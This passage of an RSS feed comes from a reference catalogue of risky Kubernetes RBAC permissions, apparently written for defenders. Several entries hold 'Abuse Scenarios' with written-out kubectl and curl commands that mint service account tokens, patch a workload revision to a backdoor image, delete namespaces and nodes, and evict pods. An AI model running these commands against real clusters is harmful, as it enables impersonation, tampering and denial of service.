 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-selfpermissionreviewquery">&lt;a href="https://rbac-atlas.github.io/tags/selfpermissionreviewquery/">SelfPermissionReviewQuery&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating SelfSubjectRulesReview resources. This enables a user or service account to query the API server for their own permissions within a namespace, which can be used to confirm successful exploitation or to discover their own capabilities for further actions.&lt;/p></description></item><item><title>Create ServiceAccount Tokens</title><link>https://rbac-atlas.github.io/rules/1047/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1047/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1047&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create ServiceAccount Tokens&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Spoofing&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>authentication.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>serviceaccounts/token&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-credentialaccess">&lt;a href="https://rbac-atlas.github.io/tags/credentialaccess/">CredentialAccess&lt;/a>&lt;/span>
 &lt;span class="tag-impersonation">&lt;a href="https://rbac-atlas.github.io/tags/impersonation/">Impersonation&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-spoofing">&lt;a href="https://rbac-atlas.github.io/tags/spoofing/">Spoofing&lt;/a>&lt;/span>
 &lt;span class="tag-tokencreation">&lt;a href="https://rbac-atlas.github.io/tags/tokencreation/">TokenCreation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating tokens for ServiceAccounts within a specific namespace. If a ServiceAccount has powerful permissions, creating a token for it allows impersonating that ServiceAccount, leading to potential privilege escalation, credential access, and spoofing.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new service account token for a specific service account.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create token &amp;lt;serviceaccount-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create token default -n default&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Create a new service account token with a specific expiration time.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create token &amp;lt;serviceaccount-name&amp;gt; -n &amp;lt;namespace&amp;gt; --duration&lt;span class="o">=&lt;/span>1h
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create token my-app-sa -n production --duration=24h&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Create ServiceAccount Tokens (ClusterRole for any SA in any namespace)</title><link>https://rbac-atlas.github.io/rules/1048/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1048/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1048&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create ServiceAccount Tokens (ClusterRole for any SA in any namespace)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Spoofing&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>authentication.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>serviceaccounts/token&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-credentialaccess">&lt;a href="https://rbac-atlas.github.io/tags/credentialaccess/">CredentialAccess&lt;/a>&lt;/span>
 &lt;span class="tag-impersonation">&lt;a href="https://rbac-atlas.github.io/tags/impersonation/">Impersonation&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-spoofing">&lt;a href="https://rbac-atlas.github.io/tags/spoofing/">Spoofing&lt;/a>&lt;/span>
 &lt;span class="tag-tokencreation">&lt;a href="https://rbac-atlas.github.io/tags/tokencreation/">TokenCreation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating tokens for any ServiceAccount in any namespace. This is highly critical as it allows an attacker to generate tokens for highly privileged ServiceAccounts (e.g., those bound to cluster-admin), leading to impersonation, credential access, and full privilege escalation.&lt;/p></description></item><item><title>Create SubjectAccessReviews (check arbitrary permissions)</title><link>https://rbac-atlas.github.io/rules/1050/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1050/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1050&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create SubjectAccessReviews (check arbitrary permissions)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>subjectaccessreviews&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-rbacquery">&lt;a href="https://rbac-atlas.github.io/tags/rbacquery/">RBACQuery&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits submitting SubjectAccessReview requests to check if an arbitrary user, group, or service account has specific permissions cluster-wide. This can be used for reconnaissance to understand the RBAC configuration and identify potential privilege escalation paths.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Check if a specific service account can create pods in any namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl auth can-i create pods --as&lt;span class="o">=&lt;/span>system:serviceaccount:&amp;lt;namespace&amp;gt;:&amp;lt;serviceaccount-name&amp;gt; --all-namespaces
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl auth can-i create pods --as=system:serviceaccount:kube-system:default --all-namespaces&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Check if a specific user can delete nodes.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl auth can-i delete nodes --as&lt;span class="o">=&lt;/span>user:&amp;lt;username&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl auth can-i delete nodes --as=admin&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Create TokenReviews (validate arbitrary tokens)</title><link>https://rbac-atlas.github.io/rules/1049/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1049/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1049&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create TokenReviews (validate arbitrary tokens)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>authentication.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>tokenreviews&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-credentialaccess">&lt;a href="https://rbac-atlas.github.io/tags/credentialaccess/">CredentialAccess&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-rbacquery">&lt;a href="https://rbac-atlas.github.io/tags/rbacquery/">RBACQuery&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows submitting TokenReview requests to the API server to validate arbitrary tokens. This can be used to probe the validity and attributes of tokens, potentially discovering active service account tokens or user tokens, leading to information disclosure about authentication.&lt;/p></description></item><item><title>Create/Update ControllerRevisions (Potential Tampering)</title><link>https://rbac-atlas.github.io/rules/1085/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1085/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1085&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Create/Update ControllerRevisions (Potential Tampering)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>controllerrevisions&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-controllerrevisiontampering">&lt;a href="https://rbac-atlas.github.io/tags/controllerrevisiontampering/">ControllerRevisionTampering&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating or updating ControllerRevisions. This could be abused to tamper with the history of workloads like Deployments or StatefulSets, potentially forcing rollbacks to vulnerable versions, manipulating state, or obscuring legitimate changes.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new ControllerRevision with a malicious image or command.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This is complex as ControllerRevisions are usually managed by controllers.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Direct creation/patching is not common and requires careful crafting of the &amp;#39;data&amp;#39; field.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: Create a new revision for a deployment, pointing to a malicious image.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This would typically be done by modifying the Deployment/StatefulSet itself.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># A direct kubectl command to create a *malicious* ControllerRevision is not practical.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Instead, focus on the ability to manipulate existing ones.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># To demonstrate, one might try to patch an existing revision&amp;#39;s data (which is base64 encoded).&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This is highly advanced and not a simple kubectl command.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Let&amp;#39;s provide a generic patch example, noting the complexity.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl patch controllerrevision &amp;lt;revision-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/spec/template/spec/containers/0/image&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;&amp;lt;malicious-image&amp;gt;&amp;#34;}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Note: The &amp;#39;data&amp;#39; field in ControllerRevision is base64 encoded. This command is illustrative.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch controllerrevision my-app-deployment-12345 -n default --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/spec/template/spec/containers/0/image&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;attacker/backdoor&amp;#34;}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Delete namespaces</title><link>https://rbac-atlas.github.io/rules/1026/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1026/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1026&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Delete namespaces&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>namespaces&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-namespacelifecycle">&lt;a href="https://rbac-atlas.github.io/tags/namespacelifecycle/">NamespaceLifecycle&lt;/a>&lt;/span>
 &lt;span class="tag-resourcedeletion">&lt;a href="https://rbac-atlas.github.io/tags/resourcedeletion/">ResourceDeletion&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits deleting entire namespaces from the cluster. This is a destructive action that can lead to a significant denial of service by removing all resources, applications, and configurations within the targeted namespaces.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Delete a specific namespace and all its resources.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete namespace &amp;lt;namespace-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete namespace production&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Delete nodes</title><link>https://rbac-atlas.github.io/rules/1016/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1016/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1016&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Delete nodes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>nodes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>delete, deletecollection&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-resourcedeletion">&lt;a href="https://rbac-atlas.github.io/tags/resourcedeletion/">ResourceDeletion&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to delete nodes from the cluster. This can lead to a severe denial of service by removing compute capacity, disrupting running applications, and potentially causing data loss for workloads not designed for sudden node disappearance.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Delete a specific node from the cluster.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete node &amp;lt;node-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete node minikube&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Escalate privileges via ClusterRoles (escalate verb)</title><link>https://rbac-atlas.github.io/rules/1031/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1031/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1031&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Escalate privileges via ClusterRoles (escalate verb)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>rbac.authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>clusterroles&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>escalate&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-rbacmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/rbacmanipulation/">RBACManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits using the &amp;rsquo;escalate&amp;rsquo; verb on ClusterRoles (or Roles). This allows a user to create or update a role with more permissions than they currently possess, up to the permissions defined in the role they are escalating, leading to direct privilege escalation.&lt;/p></description></item><item><title>Evict Pods cluster-wide</title><link>https://rbac-atlas.github.io/rules/1057/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1057/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1057&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Evict Pods cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>policy&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/eviction&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits evicting (deleting) pods across all namespaces using the eviction API. This can be used to cause denial of service by disrupting running applications throughout the cluster.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Evict all pods from a specific node, causing disruption.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl drain &amp;lt;node-name&amp;gt; --ignore-daemonsets --delete-emptydir-data
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl drain minikube --ignore-daemonsets --delete-emptydir-data&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Evict a specific pod by directly calling the eviction API.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;kubernetes-api-server&amp;gt; with your API server address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;token&amp;gt; with your authentication token&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -k -H &lt;span class="s2">&amp;#34;Authorization: Bearer &amp;lt;token&amp;gt;&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> -X POST &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --data &lt;span class="s1">&amp;#39;{&amp;#34;apiVersion&amp;#34;:&amp;#34;policy/v1&amp;#34;,&amp;#34;kind&amp;#34;:&amp;#34;Eviction&amp;#34;,&amp;#34;metadata&amp;#34;:{&amp;#34;name&amp;#34;:&amp;#34;&amp;lt;pod-name&amp;gt;&amp;#34;,&amp;#34;namespace&amp;#34;:&amp;#34;&amp;lt;namespace&amp;gt;&amp;#34;}}&amp;#39;&lt;/span> &lt;span class="se">\
